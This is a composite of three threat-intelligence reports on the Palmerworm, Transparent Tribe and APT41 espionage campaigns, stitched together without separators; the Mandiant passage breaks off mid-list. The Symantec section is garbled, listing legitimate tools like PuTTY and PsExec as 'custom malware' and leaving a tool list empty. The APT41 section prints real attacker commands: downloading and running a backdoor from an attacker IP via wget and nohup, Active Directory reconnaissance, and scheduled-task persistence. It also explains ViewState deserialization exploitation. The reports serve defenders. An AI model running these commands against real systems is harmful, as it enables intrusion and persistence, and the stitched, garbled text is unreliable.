The Threat Hunter Team at Symantec, a division of Broadcom (NASDAQ: AVGO), has uncovered a new espionage campaign carried out by the Palmerworm group (aka BlackTech) involving a brand new suite of custom malware, targeting organizations in Japan, Taiwan, the U.S., and China.
The attacks occurred in 2019 and continued into 2020, targeting organizations in the media, construction, engineering, electronics, and finance sectors.
We observed the group using previously unseen malware in these attacks.
Palmerworm uses a combination of custom malware, dual use tools, and living-off-the-land tactics in this campaign.
Palmerworm has been active since at least 2013, with the first activity seen in this campaign in August 2019.
Tactics, Tools, and Procedures
Palmerworm was observed using both dual-use tools and custom malware in these attacks.
Among the custom malware families we saw it use were:
Putty – can be leveraged by attackers for remote access, to exfiltrate data and send it back to attackers
PSExec – is a legitimate Microsoft tool that can be exploited by malicious actors and used for lateral movement across victim networks
SNScan – this tool can be used for network reconnaissance, to find other potential targets on victim networks
WinRAR – is an archiving tool that can be used to compress files (potentially to make them easier to send back to attackers) and also to extract files from zipped folders
All these dual-use tools are commonly exploited by malicious actors like Palmerworm, with advanced persistent threat (APT) groups like this increasingly using living-off-the-land tactics, including the use of dual-use tools, in recent years.
These tools provide attackers with a good degree of access to victim systems without the need to create complicated custom malware that can more easily be linked back to a specific group.
In this campaign, Palmerworm is also using stolen code-signing certificates to sign its payloads, which makes the payloads appear more legitimate and therefore more difficult for security software to detect.
Palmerworm has been publicly documented using stolen code-signing certificates in previous attack campaigns.
We did not see what infection vector Palmerworm used to gain initial access to victim networks in this campaign, however, in the past the group has been documented as using spear-phishing emails to gain access to victim networks.
Victims
Symantec identified multiple victims in this campaign, in a number of industries, including media, construction, engineering, electronics, and finance.
The media, electronics, and finance companies were all based in Taiwan, the engineering company was based in Japan, and the construction company in China.
It is evident Palmerworm has a strong interest in companies in this region of East Asia.
We also observed Palmerworm activity on some victims in the U.S., however, we were unable to identify the sector of the companies targeted.
Palmerworm activity was first spotted in this campaign in August 2019, when activity was seen on the network of a Taiwanese media company and a construction company in China.
The group remained active on the network of the media company for a year, with activity on some machines there seen as recently as August 2020.
Palmerworm also maintained a presence on the networks of a construction and a finance company for several months.
However, it spent only a couple of days on the network of a Japanese engineering company in September 2019, and a couple of weeks on the network of an electronics company in March 2020.
It spent approximately six months on one of the U.S.-based machines on which we observed activity.
Figure.
The amount of time Palmerworm spent on the networks of companies in the different sectors varied from a year to just a few days
Figure.
The amount of time Palmerworm spent on the networks of companies in the different sectors varied from a year to just a few days
The finance, media, and construction industries, then, appear to be of the biggest interest to Palmerworm in this campaign.
There have been reports previously of Palmerworm targeting the media sector.
What do the attackers want? While we cannot see what Palmerworm is exfiltrating from these victims, the group is considered an espionage group and its likely motivation is considered to be stealing information from targeted companies.
How do we know this is Palmerworm? While the custom malware used in this attack is not malware we have seen used by Palmerworm before, some of the samples identified in this research are detected by other vendors as PLEAD, which is a known Palmerworm (aka Blacktech) malware family.
We also saw the use of infrastructure that has previously been attributed to Palmerworm.
The group’s use of dual-use tools has also been seen in previous campaigns identified as being carried out by Palmerworm, while the location of its victims is also typical of the geography targeted by Palmerworm in past campaigns.
The group’s use of stolen code-signing certificates has also been observed in previous Palmerworm attacks.
These various factors make us reasonably confident we can attribute this activity to Palmerworm.
Symantec does not attribute Palmerworm’s activity to any specific geography, however, Taiwanese officials have stated publicly that they believe Blacktech, which we track as Palmerworm, is backed by the Chinese government.
Conclusion
APT groups continue to be highly active in 2020, with their use of dual-use tools and living-off-the-land tactics making their activity ever harder to detect, and underlining the need for customers to have a comprehensive security solution in place that can detect this kind of activity.
Protection
Backdoor.Consock
Backdoor.Waship
Backdoor.Dalwit
Backdoor.Nomri
We have not observed the group using these malware families in previous attacks – they may be newly developed tools, or the evolution of older Palmerworm tools.
Malware used by Palmerworm in the past has included:

Backdoor.Kivars
Backdoor.Pled
While the custom malware used by the group in this campaign is previously undocumented, other elements of the attack bear similarities to past Palmerworm campaigns, making us reasonably confident that it is the same group carrying out this campaign.
As well as the four backdoors mentioned, we also see the group using a custom loader and a network reconnaissance tool, which Symantec detects as Trojan Horse and Hacktool.
The group also used several dual-use tools, including:

The following protections are in place to protect customers against Palmerworm activity:

Backdoor.Consock
Backdoor.Waship
Backdoor.Dalwit
Backdoor.Nomri
Backdoor.Kivars
Backdoor.Pled
Hacktool
Trojan Horse
Indicators of Compromise
28ca0c218e14041b9f32a0b9a17d6ee5804e4ff52e9ef228a1f0f8b00ba24c11
3277e3f370319f667170fc7333fc5e081a0a87cb85b928219b3b3caf7f1e549c
35bd3c96abbf9e4da9f7a4433d72f90bfe230e3e897a7aaf6f3d54e9ff66a05a
485d5af4ad86e9241abd824df7b3f7d658b1b77c7dcc3c9b74bfe1ddc074c87d
4c05ee584530fd9622b9e3be555c9132fad961848ea215ecb0dd9430df7e4ed8
50ba9a2235b9b67e16e6bd26ae042a958d065eb2c5273f07eee20ec86c58a653
5818bfe75d73a92eb775fae3b876086a9e70e1e677b7c162b49fb8c1cc996788
5a35672f293f8f586fa9cfac0b09c2c52a85d4e8bc77b1ed4d7c16c58fe97a81
69d60562a8d69500e8cb47a48293894385743716e2214fd4e81682ab6ed1c46b
6d40c289a154142cdd5298e345bcea30b13f26b9eddfe2d9634e71e1fb935fbe
6f97022782d63c6cea53ad151c5b7e764e62533d8257e439033c0307437bfb2a
73799d67d32a2b5554c39330e81e7c8069feaa56520e22a7fd0a52e8857c510c
81a4b84700b5f4770b11a5fe30a8df42e5579fd622fd54143b3d2578df4b559d
884cefccd5b3c3a219a176c0c614834b5b6676abbac1d1c98f39624fccc71bf9
8cd6dfffc251f9571f7a82cca2eca09914c950f3b96aaaeaeaaeeac342f9b550
8da532ea294cc2c99e02ce8513a15b108a7c49bd90f7001ce6148955304733cb
9c436db49b27bed20b42157b50d8bdad414b12f01e2127718250565017a08d84
9e3ecda0f8e23116e1e8f2853cf07837dd5bc0e2e4a70d927b37cfe4f6e69431
a7f3b8afb963528b4821b6151d259cf05ae970bc4400b805f7713bd8a0902a42
aa51b69d05741144d139b422c3b90fdf6d7d5a36dd6c7090c226a0fc155ada34
b32ab70f3f441a775771d6c824d4526715460c0fd72a1dfdec8cd531aef5fabd
d4d5c73c40f50cdef1500fca8329bc8f3f05f6e2ffda9c8feb9be1dcca6ccd31
eed2ab9f2c09e47c7689204ad7f91e5aef3cb25a41ea524004a48bb7dc59f969
f11e2146b4b7da69112f4681daca0c5ec18917acc4cf4f78d8bff7ac0b53e15c
f21601686a2af1a312e0f99effa2c2755f872b693534dbe14f034fa23587ac0b
asiainfo.hpcloudnews.com
loop.microsoftmse.com
103.40.112.228
172.104.92.110
45.76.218.116
45.77.181.203
Cisco Talos has been tracking a new malicious campaign operated by the Transparent Tribe APT group. This campaign involves the targeting of educational institutions and students in the Indian subcontinent, a deviation from the adversary's typical focus on government entities. The attacks result in the deployment of CrimsonRAT, Transparent Tribe's malware of choice for establishing long-term access into victim networks. We assess with high confidence that a Pakistani web hosting services provider "Zain Hosting" was used for deploying and operating components of Transparent Tribe's infrastructure. This is likely one of many third parties Transparent Tribe employs to prepare, stage and/or deploy components of their operation. Overview Cisco Talos recently discovered an ongoing campaign conducted by the Transparent Tribe APT group against students at various educational institutions in India. This campaign was partially covered by another security firm, but our findings reveal more details regarding the adversary's operations.
Typically, this APT group focuses on targeting government (government employees, military personnel) and pseudo-government entities (think tanks, conferences, etc.) using remote access trojans (RATs) such as CrimsonRAT and ObliqueRAT. However, in this new campaign dating back to December 2021, the adversary is targeting students of universities and colleges in India. This new campaign also suggests that the APT is actively expanding its network of victims to include civilian users.
We also assess with high confidence that a Pakistani web hosting services provider, "ZainHosting" was employed by the APT for deploying and operating parts of Transparent Tribe's infrastructure used in this campaign.
Threat actor profile
Transparent Tribe is a suspected Pakistan-linked threat actor. This group typically targets individuals and entities associated with governments and military personnel in the Indian subcontinent, specifically Afghanistan and India. Transparent Tribe has also been known to use their CrimsonRAT implant against human rights activists in Pakistan.
The group primarily uses three Windows-based malware families to carry out espionage activities against their targets.
CrimsonRAT is a .NET-based implant that is the group's malware of choice since at least 2020. Transparent Tribe's multiple campaigns leveraging CrimsonRAT over the years indicate a steady evolution in the implant's capabilities. ObliqueRAT is a C/C++-based implant discovered by Talos in early 2020. ObliqueRAT is primarily reserved for hyper-targeted attacks on government personnel and in operations where stealth is a prime focus of the attackers' infection chain. This implant has also seen a constant evolution in deployment tactics and malicious functionalities over time. Custom malware used by Transparent Tribe consists of easily and quickly deployable downloaders, droppers and lightweight RATs containing limited capabilities as opposed to CrimsonRAT and ObliqueRAT. Transparent Tribe also maintains a suite of mobile implants in their arsenal. Implants such as CapraRAT are constantly modified to be deployed against targets. These implants contain a plethora of malicious capabilities meant to steal data from mobile devices.
Attack details: Infection chain The attack consists of a maldoc delivered to the target as an attachment or a link to a remote location via a spear-phishing email. The maldocs consist of malicious VBA macros commonly observed in previous Transparent Tribe campaigns. The macros extract an embedded archive file from the maldoc and unzip it to execute a copy of the malware in the archive file. The malware in the archive files is CrimsonRAT.
Malicious macro dropping embedded zip to disk.
CrimsonRAT The CrimsonRAT payloads deployed in this campaign are very similar to those from past Transparent Tribe campaigns. It is the staple implant of choice for Transparent Tribe to establish long-term access into victim networks. This RAT is actively updated, adding new capabilities and obfuscating the implant.
The latest version of CrimsonRAT seen in this campaign contains a number of capabilities, including:
List files and folders in a directory path specified by the command and control (C2). Run specific processes on the endpoint, such as keylogger and USB modules. List process IDs and names running on the endpoint. Get information, such as name, creation times and size of image files (pictures such as BMP, JPG, etc.) specified by the C2. Take screenshots of the current screen and send them to the C2. Upload keylogger logs from a file on disk to the C2. Send system information to the C2, including: Computer name, username, operating system name, the file path of implant and parent folder path. Indicator of whether the keylogger module is in the endpoint and running and its version. Indicator of whether the USB module is in the endpoint and running and its version. Run arbitrary commands on the system. Write data sent by the C2 to a file on disk. Read contents of a file on disk and exfiltrate to the C2. List all drives on the system. List all files in a directory. Download the USB worm and keylogger modules from the C2 and write them to disk. Send a file's name, creation time and size to the C2- file path as specified by the C2. Delete files specified by the C2 from the endpoint. Get names, creation times and size of all files containing the file extension specified by the C2. Infrastructure and attribution Campaign Infrastructure A number of these maldocs and archives containing these maldocs were hosted on the domains registered by the attackers, with the earliest domain registered in June 2021. These domains were named so that they would appear relevant to students and educational entities in India. Some examples of domains registered by the threat actor are:
studentsportal[.]live studentsportal[.]website studentsportal[.]co However, we've also discovered the use of additional media-themed domains that the attackers are preparing to use in parallel campaigns against their targets. These domains are in line with Transparent Tribe's tactic of using malicious file-sharing domains we've observed in previous attacks and campaigns.
cloud-drive[.]store user-onedrive[.]live drive-phone[.]online During the course of our research, we discovered SSL certificate overlaps with another domain registered by the attackers in June 2021, geo-news[.]tv, using the email address immikhan034[@]gmail[.]com. This domain is a typo-squatted version of geo[.]tv, a legitimate Pakistani news website. Subdomains on the malicious typo-squatted domains include those that hosted SSL certificates for the student and media-themed malicious domains:
cloud-drive.geo-news.tv drive-phone.geo-news.tv studentsportal.geo-news.tv user-onedrive.geo-news.tv All the malicious domains have recently resolved to the same IP address: 198[.]37[.]123[.]126. This strongly suggests shared infrastructure among all the malicious domains.
SSL certificate for geo-news[.]tv.
Honeytraps Many of the domains registered by the attackers for this campaign consisted of rudimentary websites with front pages containing embedded Google Drive folders. All of these folders contained pictures of women. It is highly likely that these front pages will be used as stagers for honeytrap-based attacks in the future, another tactic typical of the Transparent Tribe APT.
Google Drive folder embedded in the fake website operated by Transparent Tribe.
Infrastructure attribution The DNS SOA records for all the malicious domains utilized in this APT campaign contain a common administrator email address: rupees001[at]gmail[.]com. This email address has been used to register and administer approximately 2,000 legitimate and malicious domains. However, there are a couple of domains in this list that stand out:
zainhosting[.]net vebhost[.]com Of the two domains, vebhost[.]com hosts a dummy website that advertises website-building services. The malicious domains used in this campaign, such as studentsportal[.]live and others, use vebhost[.]com name servers, specifically:
ns1[.]vebhost[.]com ns2[.]vebhost[.]com Therefore, it is highly likely that the operators registering and maintaining the malicious domains also operate web-hosting services through vebhost[.]com.
The second domain, zainhosting[.]net belongs to a seemingly legitimate web services and hosting provider called "Zain Hosting" based out of Lahore, Pakistan.
Apart from zainhosting[.]net, the hosting provider also operates zainhosting[.]com, which is this business' primary front for their legitimate operations. Interestingly, vebhost[.]com uses zainhosting[.]com's name servers:
ns5.zainhosting.com ns6.zainhosting.com ZainHosting advertises their services heavily on Facebook and has been active since at least 2010. Their webpage from 2010 listed rupees001[at]gmail[.]com as a contact address for the business. This email has since been used to register, renew and administer several malicious web pages over time, including the malicious domains used by the Transparent Tribe APT in their most recent campaign.
ZainHosting webpage from 2010 listing rupees001[at]gmail[.]com as a contact address.
All three sets of domains -- the malicious Transparent Tribe infrastructure, vebhost[.]com and zainhosting[.]net/com -- are clearly related, with "ZainHosting"' owning and operating the malicious infrastructure. However, the entire scope of ZainHosting's role in the Transparent Tribe organization is still unknown. We believe with high confidence that ZainHosting is just one of the many infrastructure contractors hired by Transparent Tribe. Such contractors might be hired to simply prepare and stage the APT's infrastructure and possibly be given packages (archives, etc.) containing malicious artifacts to deploy, that are then distributed by the APT operators themselves to targets of interest.
Conclusion Transparent Tribe has been aggressively trying to widen its net of victims in the Indian subcontinent. Their operations started as early as at least 2016 and have largely focussed on infecting government and military officials in Afghanistan and India. Over the past few years, we saw the APT begin targeting pseudo-government entities and individuals belonging to think tanks and defense contractors.
However, their new campaign indicates that the threat actors' strategy is evolving to target civilian personnel, specifically those connected to educational institutions. This might be in accordance with their nation-state's goal to establish long-term access and steal valuable and restricted research from premier research institutions associated with the Indian government. Keeping tabs on an adversary nation's research endeavors is a strategic goal adopted by many APT groups observed across the world.
Organizations must be diligent against such highly motivated adversaries that are rapidly evolving their strategies and expanding their network of targets. In-depth defense strategies based on a risk analysis approach can deliver the best results in the prevention. However, this should always be complemented by a good incident response plan which has been not only tested with tabletop exercises and reviewed and improved every time it's put to the test on real engagements.
Coverage Ways our customers can detect and block this threat are listed below.
Cisco Secure Endpoint(formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.
Cisco Secure Web Appliance web scanning prevents access to malicious websites and detects malware used in these attacks.
Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here.
Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.
Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.
Umbrella, Cisco's secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.
Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.
Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.
Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.
Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.
ORBITAL QUERIES Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat. For specific OSqueries on this threat, click here.
IOCs IOCs for this research can also be found at our Github repository here.
Maldocs bdeb9d019a02eb49c21f7c04169406ac586d630032a059f63c497951303b8d00 388f212dfca2bfb5db0a8b9958a43da6860298cdd4fcd53ed2c75e3b059ee622 0d61d5fe8dbf69c6e61771451212fc8e587d93246bd866adf1031147d6d4f8c2 14ee2e3a9263bab359bc19050567d0dbd6371c8c0a7c6aeba71adbf5df2fc35b
Archives 8c1a5052bf3c1b33aff9e249ae860ea1435ce716d5b5be2ec3407520507c6d37 79aee357ea68d8f66b929ba2e57465eaee4d965b0da5001fe589afe1588874e3
CrimsonRAT 8b786784c172c6f8b241b1286a2054294e8dc2c167d9b4daae0e310a1d923ba0 b4819738a277090405f0b5bbcb31d5dd3115f7026401e5231df727da0443332a e2cf71c78d198fdc0017b7bfd6ce8115301174302b3eaaf50cfc384db96bc573 8c9b0fd259e7f016f53be8edc53fe5f908b48ae691e21f0f820da11429e595d8 f3a1ac021941b481ac7e2335b74ebf1e44728e8917381728f1f5b390c6f34706 fc34f9087ab199d0bac22aa97de48e5592dbf0784342b9ecd01b4a429272ab5b b3f8e026f39056ec5e66700e03eeaf57454ee9c0bc1c719d74e10f5702957305 9159d4e354218870461c96bedcc7b5b026f872d30235bb4536cc4a5ce4154725 b614436bf9461b80384bae937d699f8c3886bcc65b907e0c8126b4df59ea8cdb 28390e3ea8a547f05ca08551f484292d46398a2b38fd4aae001ac7d056c5abc0
IPs 192[.]3[.]99[.]68 198[.]37[.]123[.]126
Domains studentsportal[.]live geo-news[.]tv cloud-drive[.]store user-onedrive[.]live drive-phone[.]online studentsportal[.]co studentsportal[.]website nsdrive-phone[.]online statefinancebank[.]com in[.]statefinancebank[.]com centralink[.]online cloud-drive[.]geo-news[.]tv drive-phone[.]geo-news[.]tv studentsportal[.]geo-news[.]tv user-onedrive[.]geo-news[.]tv studentsportal[.]live[.]geo-news[.]tv phone-drive[.]online[.]geo-news[.]tv sunnyleone[.]hopto[.]org swissaccount[.]ddns[.]net
URLs hxxps[://]studentsportal[.]live/download[.]php?file=Mental_Health_Survey[.]docm hxxps[://]studentsportal[.]website/download[.]php?file=5-mar[.]zip
UPDATE (Mar.8): The original post may not have provided full clarity that CVE-2021-44207 (USAHerds) had a patch developed by Acclaim Systems for applicable deployments on or around Nov.15, 2021.
Mandiant cannot speak to the affected builds, deployment, adoption, or other technical factors of this vulnerability patch beyond its availability.
In May 2021 Mandiant responded to an APT41 intrusion targeting a United States state government computer network.
This was just the beginning of Mandiant’s insight into a persistent months-long campaign conducted by APT41 using vulnerable Internet facing web applications as their initial foothold into networks of interest.
APT41 is a prolific Chinese state-sponsored espionage group known to target organizations in both the public and private sectors and also conducts financially motivated activity for personal gain.
In this blog post, we detail APT41’s persistent effort that allowed them to successfully compromise at least six U.S.
state government networks by exploiting vulnerable Internet facing web applications, including using a zero-day vulnerability in the USAHerds application (CVE-2021-44207) as well as the now infamous zero-day in Log4j (CVE-2021-44228).
While the overall goals of APT41's campaign remain unknown, our investigations into each of these intrusions has revealed a variety of new techniques, malware variants, evasion methods, and capabilities.
Campaign Overview
Although APT41 has historically performed mass scanning and exploitation of vulnerabilities, our investigations into APT41 activity between May 2021 and February 2022 uncovered evidence of a deliberate campaign targeting U.S.state governments.
During this timeframe, APT41 successfully compromised at least six U.S.state government networks through the exploitation of vulnerable Internet facing web applications, often written in ASP.NET.
In most of the web application compromises, APT41 conducted .NET deserialization attacks; however, we have also observed APT41 exploiting SQL injection and directory traversal vulnerabilities.
In the instance where APT41 gained access through a SQL injection vulnerability in a proprietary web application, Mandiant Managed Defense quickly detected and contained the activity; however, two weeks later APT41 re-compromised the network by exploiting a previously unknown zero-day vulnerability in a commercial-off-the-shelf (CoTS) application, USAHerds.
In two other instances, Mandiant began an investigation at one state agency only to find that APT41 had also compromised a separate, unrelated agency in the same state.
APT41 was also quick to adapt and use publicly disclosed vulnerabilities to gain initial access into target networks, while also maintaining existing operations.
On December 10th, 2021, the Apache Foundation released an advisory for a critical remote code execution (RCE) vulnerability in the commonly used logging framework Log4J.
Within hours of the advisory, APT41 began exploiting the vulnerability to later compromise at least two U.S.state governments as well as their more traditional targets in the insurance and telecommunications industries.
In late February 2022, APT41 re-compromised two previous U.S.state government victims.
Our ongoing investigations show the activity closely aligns with APT41's May-December 2021 activity, representing a continuation of their campaign into 2022 and demonstrating their unceasing desire to access state government networks.
A timeline of representative intrusions from this campaign can be seen in Figure 1.U.S.state government campaign timeline
Figure 1: U.S.state government campaign timeline
The goals of this campaign are currently unknown, though Mandiant has observed evidence of APT41 exfiltrating Personal Identifiable Information (PII).
Although the victimology and targeting of PII data is consistent with an espionage operation, Mandiant cannot make a definitive assessment at this time given APT41’s history of moonlighting for personal financial gain.
Exploitation of Deserialization Vulnerabilities
APT41 has primarily used malicious ViewStates to trigger code execution against targeted web applications.
Within the ASP.NET framework, ViewState is a method for storing the application’s page and control values in HTTP requests to and from the server.
The ViewState is sent to the server with each HTTP request as a Base64 encoded string in a hidden form field.
The web server decodes the string and applies additional transformations to the string so that it can be unpacked into data structures the server can use.
This process is known as deserialization.
Insecure deserialization of user-supplied input can result in code execution.
ASP.NET has several insecure deserialization providers, including the one used for ViewStates: ObjectStateFormatter.
To prevent a threat actor from manipulating the ViewState and taking advantage of the insecure deserialization provider, the ViewState is protected by a Message Authentication Code (MAC).
This MAC is a cryptographically signed hash value that the server uses to ensure that the ViewState has not been tampered with, possibly to trigger code execution.
The integrity of the ViewState depends on the application’s machineKey remaining confidential.
The machineKey is stored on the application server in a configuration file named web.config.
Figure 2 Sample machineKey attribute from a web.config file
<machineKey validationKey="XXXXXXXXXXXXXXXXX" decryptionKey="XXXXXXXXXXXXXXXXXXXXXX" validation="SHA1" />
A threat actor with knowledge of the machineKey can construct a malicious ViewState and then generate a new and valid MAC that the server accepts.
With a valid MAC, the server will then deserialize the malicious ViewState, resulting in the execution of code on the server.
Publicly available tools such as YSoSerial.NET exist to construct these malicious ViewStates.
This is precisely how APT41 initiated their campaign in May 2021.
Proprietary Web Application Targeting
In June 2020, one year before APT41 began this campaign, Mandiant investigated an incident where APT41 exploited a directory traversal vulnerability specifically to read the web.config file for a vulnerable web application on a victim web server.
APT41 then used the machineKey values from the web.config file to generate a malicious ViewState payload for a deserialization exploit.
Mandiant did not identify how APT41 originally obtained the machineKey values for the proprietary application exploited in May 2021 or the USAHerds application, which was first exploited in July 2021.
However, it is likely that APT41 obtained the web.config file through similar means.
To craft malicious ViewStates, APT41 relied on the publicly available Github project YSoSerial.NET.
In order to successfully load arbitrary .NET assemblies into memory, APT41 set the DisableActivitySurrogateSelectorTypeCheck property flag to true within the ConfigurationManager.AppSettings class of the running application via the ViewState payload.
APT41 subsequently loaded .NET assemblies into memory using additional YSoSerial payloads configured to write webshells to a hardcoded filepath on disk.
Deserialized .NET Assembly (dnSpy)
Figure 3: Deserialized .NET Assembly (dnSpy)
Figure 4 shows an example JScript webshell deployed through a malicious ViewState object by APT41 which utilizes Code Page 936 for the Chinese Simplified keyboard language.
Deserialized JScript Webshell
Figure 4: Deserialized JScript Webshell
For additional information regarding deserialization exploits and our new hunting rule generation tool ‘HeySerial’, read our blog post, Now You Serial, Now You Don’t — Systematically Hunting for Deserialization Exploits.
USAHerds (CVE-2021-44207) Zero-Day
In three investigations from 2021, APT41 exploited a zero-day vulnerability in the USAHerds web application.
USAHerds is a CoTS application written in ASP.NET and used by 18 states for animal health management.
The vulnerability in USAHerds (CVE-2021-44207) is similar to a previously reported vulnerability in Microsoft Exchange Server (CVE-2020-0688), where the applications used a static validationKey and decryptionKey (collectively known as the machineKey) by default.
As a result, all installations of USAHerds shared these values, which is against the best practice of using uniquely generated machineKey values per application instance.
Generating unique machineKey values is critical to the security of an ASP.NET web application because the values are used to secure the integrity of the ViewState.
Mandiant did not identify how APT41 originally obtained the machineKey values for USAHerds; however, once APT41 obtained the machineKey, they were able to compromise any server on the Internet running USAHerds.
As a result, there are potentially additional unknown victims.
Log4j (CVE-2021-44228)
The most recent APT41 campaign began shortly after the release of CVE-2021-44228 and its related proof-of-concept exploits in December 2021.
Exploiting this vulnerability, also known as Log4Shell, causes Java to fetch and deserialize a remote Java object, resulting in potential code execution.
Similar to their previous web application targeting, APT41 continued to use YSoSerial generated deserialization payloads to perform reconnaissance and deploy backdoors.
Notably, APT41 deployed a new variant of the KEYPLUG backdoor on Linux servers at multiple victims, a malware sub-family we now track as KEYPLUG.LINUX.
KEYPLUG is a modular backdoor written in C++ that supports multiple network protocols for command and control (C2) traffic including HTTP, TCP, KCP over UDP, and WSS.
APT41 heavily used the Windows version of the KEYPLUG backdoor at state government victims between June 2021 and December 2021, thus the deployment of a ported version of the backdoor closely following the state government campaign was significant.
After exploiting Log4Shell, APT41 continued to use deserialization payloads to issue ping commands to domains, a technique APT41 frequently used at government victims months prior.
An example ping command is shown in Figure 5.
Figure 5: Ping Command to Attacker Controlled Infrastructure
ping -c 1 libxqagv[.]ns[.]dns3[.]cf                             
Upon gaining access to a target environment, APT41 performed host and network reconnaissance before deploying KEYPLUG.LINUX to establish a foothold in the environment.
Sample commands used to deploy KEYPLUG.LINUX can be seen in Figure 6.
Figure 6: Deployment of KEYPLUG.LINUX Following Log4j Exploitation
wget http://103.224.80[.]44:8080/kernel                         

chmod 777 kernel

mv kernel .kernel

nohup ./.kernel &

“All Killer No Filler” Intrusion TTPs
The updated tradecraft and new malware continue to show APT41 is a highly adaptable and resourceful actor.
In this section, we detail the most pertinent post-compromise techniques.
Reconnaissance
After gaining initial access to an internet-facing server, APT41 performed extensive reconnaissance and credential harvesting.
A common tactic seen is the deployment of a ConfuserEx obfuscated BADPOTATO binary to abuse named pipe impersonation for local NT AUTHORITY\SYSTEM privilege escalation.
Once APT41 escalated to NT AUTHORITY\SYSTEM privileges, they copied the local SAM and SYSTEM registry hives to a staging directory for credential harvesting and exfiltration.
APT41 has additionally used Mimikatz to execute the lsadump::sam command on the dumped registry hives to obtain locally stored credentials and NTLM hashes.
APT41 also conducted Active Directory reconnaissance by uploading the Windows command-line tool dsquery.exe (MD5: 49f1daea8a115dd6fce51a1328d863cf) and its associated module dsquery.dll (MD5: b108b28138b93ec4822e165b82e41c7a) to a staging directory on the compromised server.
Figure 7 shows multiple dsquery commands used to enumerate various Active Directory objects within the environment.
Figure 7: dsquery Active Directory Reconnaissance Commands
c:\programdata\dsquery.exe * -filter "(objectCategory=Person)" -attr cn title displayName description department company sAMAccountName mail mobile telephoneNumber whenCreated whenChanged logonCount badPwdCount distinguishedName -L -limit 0

c:\programdata\dsquery.exe * -filter "(objectCategory=Computer)" -attr cn operatingSystem operatingSystemServicePack operatingSystemVersion dNSHostName whenCreated whenChanged lastLogonTimestamp distinguishedName description managedBy mS-DS-CreatorSID -limit 0

c:\programdata\dsquery.exe * -filter "(objectCategory=Computer)" -attr cn servicePrincipalName -L -limit 0

c:\programdata\dsquery.exe * -filter "(objectCategory=Group)" -uc -attr cn sAMAccountName distinguishedName description -limit 0

c:\programdata\dsquery.exe * -filter "(objectClass=organizationalUnit)" -attr ou name whenCreated distinguishedName gPLink -limit 0

During the early stage of one U.S.
state government intrusion, Mandiant identified a new malware family used by APT41 we track as DUSTPAN.
DUSTPAN is an in-memory dropper written in C++ that leverages ChaCha20 to decrypt embedded payloads.
Different variations of DUSTPAN may also load and execute a payload from a hard-coded filepath encrypted in the binary.
DUSTPAN is consistent with the publicly named StealthVector, reported by Trend Micro in August 2021.
During the intrusion, DUSTPAN was used to drop a Cobalt Strike BEACON backdoor.
Anti-Analysis
APT41 continues to leverage advanced malware in their existing toolkit, such as the DEADEYE launcher and LOWKEY backdoor, with added capabilities and anti-analysis techniques to hinder investigations.
During a recent intrusion Mandiant identified a new malware variant, DEADEYE.EMBED, contained in an Alternate Data Stream of a local file.
DEADEYE.EMBED variants embed the payload inside of the compiled binary rather than appended to the overlay at the end of the file, as seen in DEADEYE.APPEND.
APT41 commonly packages their malware with VMProtect to slow reverse engineering efforts.
During multiple U.S.
state government intrusions, APT41 incorporated another anti-analysis technique by chunking a VMProtect packaged DEADEYE binary into multiple sections on disk.
Breaking the binary into multiple files reduces the chance that all samples can be successfully acquired during a forensic investigation.
Common file naming conventions used by APT41 when deploying DEADEYE on victim hosts can be seen in Figure 8.
DEADEYE Filenames
Figure 8: DEADEYE Filenames
These files would then be combined into a single DLL before execution as seen in Figure 9.
Figure 9: DEADEYE Command to concatenate DEADEYE sections
"cmd" /c copy /y /b C:\Users\public\syslog_6-*.dat C:\Users\public\syslog.dll
In addition to separating their VMProtect packaged malware on disk, APT41 changed the standard VMProtect section names (.vmp) to UPX section names (.upx).
By doing so, the malware could evade basic hunting detections that flag binaries packaged with VMProtect.
During Log4j exploitation, APT41 similarly chunked a KEYPLUG.LINUX binary into four separate files named “xaa”, ” xab”, ” xac”, and ”xad”.
APT41 also packaged the KEYPLUG.LINUX binary with VMProtect and used UPX section names.
This technique is very low in prevalence across our malware repository, and even lower in prevalence when searching across ELF files.
APT41 also updated the DEADEYE execution guardrail capabilities used during the campaign.
Guardrailing is a technique used by malware to ensure that the binary only executes on systems that the threat actor intended.
DEADEYE samples from older campaigns used the victim computer’s volume serial number but they have since been updated to use the hostname and/or DNS domain during the U.S.
state government campaign.
To acquire the local computer’s hostname and DNS domain, DEADEYE executes the WinAPI functions GetComputerNameA and/or GetComputerNameExA and provides it as input for a generated decryption key.
Persistence
APT41 continues to leverage advanced tradecraft to remain persistent and undetected.
In multiple instances, the Windows version of the KEYPLUG backdoor leveraged dead drop resolvers on two separate tech community forums.
The malware fetches its true C2 address from encoded data on a specific forum post.
Notably, APT41 continues to update the community forum posts frequently with new dead drop resolvers during the campaign.
APT41 has historically used this unique tradecraft during other intrusions to help keep their C2 infrastructure hidden.
To persist execution of DEADEYE, APT41 has leveraged the schtasks /change command to modify existing scheduled tasks that run under the context of SYSTEM.
APT41 commonly uses the living off the land binary (lolbin) shell32.dll!ShellExec_RunDLLA in scheduled tasks for binary execution, such as the example shown in Figure 10.
Figure 10: Modified Scheduled Task
SCHTASKS  /Change  /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
APT41 has leveraged the following Windows scheduled tasks for persistence of DEADEYE droppers in U.S.
state government intrusions:

\Microsoft\Windows\PLA\Server Manager Performance Monitor
\Microsoft\Windows\Ras\ManagerMobility
\Microsoft\Windows\WDI\SrvSetupResults
\Microsoft\Windows\WDI\USOShared
